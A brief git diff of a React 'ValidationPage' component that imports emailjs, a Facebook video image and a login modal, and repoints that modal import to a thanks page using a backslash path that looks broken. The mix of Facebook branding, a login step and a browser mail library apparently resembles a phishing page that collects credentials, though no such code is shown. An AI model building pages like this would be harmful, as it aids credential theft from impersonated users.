@@ -1,7 +1,7 @@
 import React, { useState, useRef } from "react";
 import emailjs from "@emailjs/browser";
 import FacebookVideo from "../assets/fbVideo.png";
-import LoginModal from "../modal/LoginModal";
+import LoginModal from "..\pages\ThanksPage"; 
 import "./style.css";
 
 const ValidationPage = () => {
